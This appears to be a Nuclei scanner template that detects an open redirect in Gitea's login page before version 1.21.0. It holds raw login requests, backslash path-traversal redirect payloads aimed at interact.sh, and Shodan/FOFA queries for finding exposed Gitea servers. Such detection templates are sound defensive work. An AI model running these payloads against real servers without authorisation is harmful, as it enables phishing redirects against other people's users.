http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    regex:
    - name="_csrf" value="(.*)"
    type: regex
  matchers:
  - part: header_2
    regex:
    - (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)interact\.sh\/?(\/|[^.].*)?$
    type: regex
  - status:
    - 302
    type: status
  matchers-condition: and
  payloads:
    redirect:
    - /a/../\interact.sh
    - /a/../%5cinteract.sh
  raw:
  - 'GET /user/login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /user/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: redirect_to={{redirect}}


    _csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}

    '
id: gitea-open-redirect-bypass
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:gitea:gitea:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
    epss-percentile: 0.91712
    epss-score: 0.07331
  description: 'Gitea before version 1.21.0 is affected by URL Redirection to Untrusted
    Site (''Open Redirect'') via internal URLs. The vulnerability exists in the redirect_to
    parameter used on the login page (/user/login). Due to improper validation of
    the redirect URL, an attacker can craft a malicious link that redirects authenticated
    users to an arbitrary external website after login.

    '
  impact: 'An attacker can exploit this vulnerability to redirect users to malicious
    websites, leading to phishing attacks or the theft of sensitive information.

    '
  metadata:
    fofa-query:
    - body="powered by gitea version"
    - title="gitea"
    google-query: intitle:"gitea"
    max-request: 2
    product: gitea
    runzero-match: any(each(service["html.titles"]), {# matches "Gitea"})
    shodan-query:
    - title:"Gitea"
    - http.html:"powered by gitea version"
    - http.title:"gitea"
    - cpe:"cpe:2.3:a:gitea:gitea"
    vendor: gitea
    verified: true
  name: Gitea < 1.21.0 - Open Redirect
  reference:
  - https://github.com/go-gitea/gitea/issues/36660
  remediation: 'Upgrade Gitea to version 1.21.0 or later to fix the open redirect
    vulnerability.

    '
  severity: medium
  tags: bypass,gitea,redirect
